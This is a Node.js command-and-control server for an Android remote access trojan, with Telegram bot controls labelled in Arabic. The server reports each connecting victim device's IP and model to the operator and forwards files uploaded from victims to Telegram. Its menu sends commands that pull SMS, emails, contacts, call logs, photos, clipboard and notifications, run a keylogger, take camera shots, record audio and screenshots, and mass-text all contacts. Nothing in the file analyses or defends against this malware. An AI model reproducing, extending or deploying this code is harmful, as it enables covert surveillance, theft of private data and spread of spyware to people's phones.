const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const telegramBot = require('node-telegram-bot-api');
const multer = require('multer');
const fs = require('fs');

const app = express();
const server = http.createServer(app);
const io = new Server(server);
const uploader = multer();

const data = JSON.parse(fs.readFileSync('./data.json', 'utf8'));
const bot = new telegramBot(data.token, { polling: true });
const appData = new Map();

app.get('/', (req, res) => res.send('Rainbow Server is Running'));
app.post('/upload', uploader.single('file'), (req, res) => {
    if (req.file) {
        bot.sendDocument(data.id, req.file.buffer, {
            caption: `📥 ملف مستلم: ${req.file.originalname}`
        }, { filename: req.file.originalname });
    }
    res.send('Done');
});

io.on('connection', (socket) => {
    let ip = socket.handshake.headers['x-forwarded-for'] || socket.handshake.address;
    let model = socket.handshake.headers['user-agent'] || 'Unknown Device';
    
    appData.set(socket.id, socket);
    
    bot.sendMessage(data.id, `🟢 جهاز متصل:\nIP: ${ip}\nDevice: ${model}`);

    socket.on('disconnect', () => {
        bot.sendMessage(data.id, `🔴 جهاز فصل: ${model}`);
    });
});

bot.on('message', (msg) => {
    if (msg.chat.id != data.id) return;

    if (msg.text === '/start') {
        bot.sendMessage(data.id, 'أهلاً بك في لوحة التحكم!\nاكتب /agents لعرض الأجهزة.', {
            reply_markup: {
                keyboard: [['📱 عرض الأجهزة']],
                resize_keyboard: true
            }
        });
        return;
    }

    if (msg.text === '/agents' || msg.text === '📱 عرض الأجهزة') {
        let devices = io.sockets.sockets;
        if (devices.size === 0) return bot.sendMessage(data.id, 'لا يوجد أجهزة متصلة.');
        
        let keyboard = [];
        devices.forEach((s, id) => {
            let info = s.handshake.headers['user-agent'] || 'Device';
            keyboard.push([{ text: info.substring(0, 20), callback_data: id + '|select' }]);
        });
        bot.sendMessage(data.id, 'اختر الجهاز:', { reply_markup: { inline_keyboard: keyboard } });
        return;
    }
});

bot.on('callback_query', (query) => {
    let [socketId, action] = query.data.split('|');
    
    if (action === 'select') {
        appData.set('current_target', socketId);
        bot.answerCallbackQuery(query.id, { text: 'تم اختيار الجهاز' });
        
        bot.sendMessage(data.id, 'تم اختيار الجهاز. اختر الأمر:', {
            reply_markup: {
                inline_keyboard: [
                    [{ text: '📊 سحب SMS', callback_data: socketId + '|all-sms' }, { text: '📧 سحب الإيميلات', callback_data: socketId + '|all-email' }],
                    [{ text: '👥 جهات الاتصال', callback_data: socketId + '|contacts' }, { text: '📞 سجل المكالمات', callback_data: socketId + '|calls' }],
                    [{ text: '📸 كاميرا أمامية', callback_data: socketId + '|main-camera' }, { text: '🤳 كاميرا سيلفي', callback_data: socketId + '|selfie-cam' }],
                    [{ text: '🎙 تسجيل صوت', callback_data: socketId + '|recordVoice' }, { text: '🔊 تشغيل صوت', callback_data: socketId + '|playAudio' }],
                    [{ text: '📺 لقطة شاشة', callback_data: socketId + '|screenshot' }, { text: '📂 مستكشف الملفات', callback_data: socketId + '|file-explorer' }],
                    [{ text: '🖼 سحب الصور', callback_data: socketId + '|gallery' }, { text: '📱 التطبيقات', callback_data: socketId + '|apps' }],
                    [{ text: '⌨️ الكيبورد', callback_data: socketId + '|keylogger' }, { text: '📋 الحافظة', callback_data: socketId + '|clipboard' }],
                    [{ text: '🔔 الإشعارات', callback_data: socketId + '|notifications' }, { text: '📳 اهتزاز', callback_data: socketId + '|vibrate' }],
                    [{ text: '☎️ إجراء مكالمة', callback_data: socketId + '|makeCall' }, { text: '💬 إرسال SMS', callback_data: socketId + '|sendSms' }],
                    [{ text: '✉️ إرسال SMS للكل', callback_data: socketId + '|smsToAllContacts' }, { text: '✉️ إرسال نص للكل', callback_data: socketId + '|textToAllContacts' }]
                ]
            }
        });
    } else {
        io.to(socketId).emit('command', { request: action, extras: [] });
        bot.answerCallbackQuery(query.id, { text: 'تم إرسال الأمر' });
    }
});

setInterval(() => {
    io.sockets.sockets.forEach((s) => s.emit('ping', {}));
}, 9000);

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => console.log('Server running on port ' + PORT));
